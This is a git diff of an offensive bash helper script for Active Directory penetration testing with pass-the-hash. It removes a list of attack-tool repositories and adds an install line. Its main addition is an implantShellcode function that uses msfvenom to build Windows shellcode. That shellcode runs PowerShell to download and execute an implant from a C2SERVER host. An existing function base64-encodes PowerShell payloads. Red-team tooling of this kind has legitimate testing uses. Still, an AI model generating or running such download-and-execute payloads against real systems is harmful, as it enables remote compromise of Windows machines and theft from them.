@@ -1,23 +1,6 @@
 #!/usr/bin/env bash
 # DESCRIPTION: This script contains bash helper functions for basic pentesting tasks with local and domain PTH.
-
-# SECTION: Required dependencies:
-# DESCRIPTION: Required github repositories used in helper functions.
-
-# https://github.com/dirkjanm/adidnsdump
-# https://github.com/fox-it/adconnectdump.git
-# https://github.com/Hackplayers/evil-winrm.git
-# https://github.com/SecureAuthCorp/impacket.git
-# https://github.com/dirkjanm/krbrelayx.git
-# https://github.com/fox-it/mitm6.git
-# https://github.com/the-useless-one/pywerview.git
-# https://github.com/Gallopsled/pwntools.git
-# https://github.com/fox-it/BloodHound.py.git
-# https://github.com/wshepherd0010/network.git
-# https://github.com/5alt/ultrarelay.git
-# apt-get install googlesearch
-
-# SECTION: Global environment variables:
+# SECTION: Global environment variables -- top section:
 # DESCRIPTION: Environment variables used in helper functions -- DOMAIN, USER, PASSWORD, DCIP, C2SERVER, and IMPLANT.
 
 export HELPER="${PWD}/helpers.sh";
@@ -59,6 +42,7 @@ function installHelper(){
     git clone https://github.com/Gallopsled/pwntools.git
     git clone https://github.com/fox-it/BloodHound.py.git
     git clone https://github.com/5alt/ultrarelay.git
+    apt-get install googlesearch;
     return;
 }
 
@@ -121,6 +105,17 @@ function encodePayload(){
     # ARGUMENT: PAYLOAD.
     PAYLOAD=$1
     echo $PAYLOAD | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n";
+    return;
+}
+
+function implantShellcode(){
+    # DESCRIPTION: Generates x64 shellcode for PS implants.
+    # ARGUMENT: None.
+    msfvenom -a x64 \
+        --platform windows \
+        -p windows/x64/exec \
+        cmd="powershell \"iex(new-object net.webclient).downloadstring('http://${C2SERVER}/${IMPLANT}')\"" \
+        -f  powershell;
     return;
 }
 
